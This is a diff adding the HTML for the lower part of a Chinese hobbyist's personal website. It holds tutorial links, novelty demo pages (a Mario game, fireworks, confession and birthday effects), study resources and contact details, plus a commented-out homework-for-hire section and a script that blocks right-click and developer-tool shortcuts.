+        <div class="popup">
+            <h3><a href="https://mp.csdn.net/mp_blog/creation/editor/122625776" target="_blank"
+                    style="color:#212529">☞HTML生日快乐代码</a></h3>
+            <p class="mt-4">基础效果，自取代码。</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+    <!-- //popup -->
+    <!-- popup-->
+    <div id="gal3" class="pop-overlay animate">
+        <div class="popup">
+            <h3><a href="#" target="_blank" style="color:#212529">敬请期待。</a></h3>
+            <p class="mt-4">。。。。。</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+    <div id="gal4" class="pop-overlay animate">
+        <div class="popup">
+            <h3><a href="#" target="_blank" style="color:#212529">敬请期待。</a></h3>
+            <p class="mt-4">。。。。。</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+    <div id="gal5" class="pop-overlay animate">
+        <div class="popup">
+            <h3><a href="https://www.bilibili.com/video/BV1Yh411o7Sz/?spm_id_from=333.337.search-card.all.click"
+                    target="_blank" style="color:#212529">python小破站爬虫课程</a></h3>
+            <p class="mt-4">我就是跟啵啵老师学的，挺不错一个老师。</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+    <div id="gal6" class="pop-overlay animate">
+        <div class="popup">
+            <h3><a href="https://mp.csdn.net/mp_blog/creation/editor/121265243" target="_blank"
+                    style="color:#212529">☞c语言教程（1）——基础知识</a></h3>
+            <p class="mt-4">这里有c语言的基础教程</p>
+            <a class="close" href="#love">&times;</a>
+        </div>
+    </div>
+</section>
+<!--// gallery -->
+<section class="blog_hcls_w3layouts py-lg-5 py-5" id="fun">
+    <div class="container py-sm-5 py-4">
+        <div class="header py-lg-5 py-3 text-center">
+            <h3 class="tittle mb-lg-3 mb-3">在线趣玩</h3>
+        </div>
+        <div class="feature-grids row text-center">
+            <div class="col-lg-6 photo-gd">
+                <div class="thumbnail card">
+
+                    <div class="caption card-body p-lg-5 p-3">
+                        <h4 class="group card-title inner list-group-item-heading">
+                            <a style="color:#212529" href="tiangou.html" target="_blank">舔狗语录（点我）</a>
+                        </h4>
+                        <p class="list-group-item-text">直接点标题就可以进入了，会自动生成随机的舔狗语录，可以进去尝试一下。</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-lg-6 photo-gd">
+                <div class="thumbnail card">
+
+                    <div class="caption card-body p-lg-5 p-3">
+                        <h4 class="group card-title inner list-group-item-heading">
+                            <a style="color:#212529" href="pictures.html" target="_blank">随机图片（点我）</a>
+                        </h4>
+                        <p class="list-group-item-text">直接点标题就可以进入了，可以返回一个随机图片。（美女、头像、壁纸等等）</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<!--/team -->
+<!--<section class="blog_hcls_w3layouts py-lg-5 py-5" id="job">
+        <div class="container py-sm-5 py-4">
+            <div class="header py-lg-5 py-3 text-center">
+                <h3 class="tittle mb-lg-3 mb-3">作业代做</h3>
+            </div>
+            <div class="feature-grids row text-center">
+                <div class="col-lg-6 photo-gd">
+                    <div class="thumbnail card">
+
+                        <div class="caption card-body p-lg-5 p-3">
+                            <h4 class="group card-title inner list-group-item-heading">
+                                平时作业</h4>
+                            <p class="list-group-item-text">平时的作业比如：C语言、r语言、python、java、html等等大学的作业，我都是可以写的。到目前为止已经接了很多次同学的作业了，有些同学从大一到大二都是一直找我，在这里感谢他们的信任！</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 photo-gd">
+                    <div class="thumbnail card">
+
+                        <div class="caption card-body p-lg-5 p-3">
+                            <h4 class="group card-title inner list-group-item-heading">
+                                期末大作业</h4>
+                            <p class="list-group-item-text">你们可以只要我写代码，然后我会在代码旁边写一些注释；当然代码和完整报告都需要我写的话，价格就需要好好商量了，争取双方都满意为止！除次之外我这里还有一些现成的代码+报告，比如r语言的数据分析等等。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>-->
+<section class="blog_hcls_w3layouts py-lg-5 py-5" id="happy">
+    <div class="container py-sm-5 py-4">
+        <div class="header py-lg-5 py-3 text-center">
+            <h3 class="tittle mb-lg-3 mb-3">学习资料</h3>
+            <p style="text-align:center">下面（一）是学习辅助工具，（二）是一个基础的学习网站大家可以点击标题进链接看一下，想做网页的可以加QQ1029661371。（随缘做）</p>
+            <div class="feature-grids row text-center">
+                <div class="col-lg-6 photo-gd">
+                    <div class="thumbnail card">
+                        <div class="caption card-body p-lg-5 p-3">
+                            <h4 class="group card-title inner list-group-item-heading">
+                                <a style="color:#212529" href="https://www.chat2ai.cn/" target="_blank">（一）</a>
+                            </h4>
+                            <p class="list-group-item-text" style="height: 65px;">各大工具，俺觉得挺不错的。</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6 photo-gd">
+                    <div class="thumbnail card">
+
+                        <div class="caption card-body p-lg-5 p-3">
+                            <h4 class="group card-title inner list-group-item-heading">
+                                <a style="color:#212529"
+                                    href="https://blog.csdn.net/abcdef314159/article/details/109683455"
+                                    target="_blank">（二）</a>
+                            </h4>
+                            <p class="list-group-item-text">这是本人找得，里面有很多学习的网站。有一些对于初学者挺不错的。</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="blog_hcls_w3layouts py-lg-5 py-5 " id="demo">
+
+    <div class="container py-sm-5 py-4">
+        <div class="header py-lg-5 py-3 text-center">
+            <h3 class="tittle mb-lg-3 mb-3">部分代码在线演示</h3>
+            <p style="text-align:center">下面是<span>一些</span>效果，大家可以点击查看演示。</p>
+            <div class="ai_card">
+                <div class="w1200">
+                    <ul>
+                        <li>
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2023-08-13 202238.jpg" width="350px" height="148px" />
+                                </div>
+                                <h3>玛丽奥小游戏</h3>
+                                <p>可以体验一下，有三次复活机会PS:目前只能电脑玩</p>
+                            </div>
+                            <a href="maliao.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                        <li class="active">
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2022-07-06 181158.jpg" width="350px" height="148px;" />
+                                </div>
+                                <h3>网页表白代码</h3>
+                                <p>网页表白代码</p>
+                            </div>
+                            <a href="demo2.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                        <li>
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2023-08-13 202556.jpg" width="350px" height="148px" />
+                                </div>
+                                <h3>3D烟花</h3>
+                                <p>。。。。。。。。。。。。。。。。。</p>
+                            </div>
+                            <a href="yanhua.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                        <li>
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2022-07-06 181510.jpg" width="350px" height="148px" />
+                                </div>
+                                <h3>动态爱心</h3>
+                                <p>这个效果是动态的爱心，上面有在一起的时间，一直会走动。</p>
+                            </div>
+                            <a href="demo4.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                        <li>
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2022-07-06 181625.jpg" width="350px" height="148px" />
+                                </div>
+                                <h3>生日快乐祝福</h3>
+                                <p>生日快乐祝福。</p>
+                            </div>
+                            <a href="demo5.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                        <li>
+                            <div class="info">
+                                <div class="img">
+                                    <img src="image/屏幕截图 2023-08-13 220944.jpg" width="350px" height="148px" />
+                                </div>
+                                <h3>HappyNewyear</h3>
+                                <p>HappyNewyear</p>
+                            </div>
+                            <a href="../newyear/index.html" class="btn" target="_blank">查看演示</a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<script type="text/javascript">
+    $(function () {
+        $('.ai_card ul li').hover(function () {
+            $(this).addClass('active').siblings().removeClass('active');
+        })
+    })
+</script>
+<section class="stats py-lg-5 py-4" id="contact">
+    <!-- footer -->
+    <footer class="footer-content py-sm-5 py-4">
+        <div class="container py-xl-5 py-lg-3">
+            <div class="contact_grid_left">
+                <ul class="list-unstyled row loaction-content">
+                    <li class="col-lg-4 address-content-inf-w3ls">
+                        <div class="row">
+                            <div class="col-md-3 icon-left">
+                                <span class="fa fa-home"></span>
+                            </div>
+                            <div class="col-md-9 icon-right">
+                                <h6>地址</h6>
+                                <p>广东省阳江市江城区
+                                </p>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="col-lg-4 address-content-inf-w3ls">
+                        <div class="row">
+                            <div class="col-md-3 icon-left">
+                                <span class="fa fa-envelope"></span>
+                            </div>
+                            <div class="col-md-9 icon-right">
+                                <h6>邮箱</h6>
+                                <p>1029661371@qq.com</p>
+
+                            </div>
+                        </div>
+                    </li>
+                    <li class="col-lg-4 address-content-inf-w3ls">
+                        <div class="row">
+                            <div class="col-md-3 icon-left">
+                                <span class="fa fa-phone"></span>
+                            </div>
+                            <div class="col-md-9 icon-right">
+                                <h6>qq账号</h6>
+                                <p>1029661371</p>
+
+                            </div>
+                        </div>
+                    </li>
+                </ul>
+            </div>
+</section>
+<!-- social icons footer -->
+<div class="w3ls-footer text-center mt-4">
+    <ul class="list-unstyled">
+        <a class="csdn" href="javascript:">
+            <img src="./images/csdn.png" width="20" height="20">
+        </a>
+        <li>
+
+
+        </li>
+        <a class="qq" href="javascript:">
+            <img src="image/QQ.svg" width="20" height="20">
+        </a>
+        <li>
+
+        </li>
+        <a class="wx" href="javascript:">
+            <img src="image/微信.svg" width="20" height="20">
+        </a>
+
+    </ul>
+</div>
+<!-- copyright -->
+<p class="copy-right-grids text-li text-center my-sm-4 my-4">@程总</p>
+
+<div class="top_move text-center">
+
+    <!--                <a href="#home" class="move-top"><span class="fa fa-angle-up  mb-3" aria-hidden="true"></span></a>-->
+    <a href="#home" target="_blank" style="color:#8c9398">程总的个人站点</a>
+    <a href="tiangou.html" target="_blank" style="color:#8c9398">舔狗语录</a>
+    <a href="pictures.html" target="_blank" style="color:#8c9398">随机图片</a>
+    <a href="happynewyear.html" target="_blank" style="color:#8c9398">新年倒计时</a>
+    <a href="https://beian.miit.gov.cn/" target="_blank" style="color:#8c9398">粤ICP备2021001211号-2</a>
+</div>
+<!-- //copyright -->
+</div>
+</footer>
+<!-- footer -->
+<a href="#home" style="position:fixed;right:10px;bottom:10px;z-index: 20000;"><img src="image/上传.svg" width="50"
+        height="50"></a>
+
+
+<script>
+    window.onload = function () {
+        document.onkeydown = function () {
+            var e = window.event || arguments[0];
+            if (e.keyCode == 123) {
+                alert("请尊重劳动成果！");
+                return false;
+            } else if ((e.ctrlKey) && (e.shiftKey) && (e.keyCode == 73)) {
+                alert("请尊重劳动成果！");
+                return false;
+            } else if ((e.ctrlKey) && (e.keyCode == 85)) {//追加
+
+                return false;
+            }
+        };
+        document.oncontextmenu = function () {
+            alert("请尊重劳动成果！");
+            return false;
+        }
+    }
+</script>
+</body>
+
+</html>
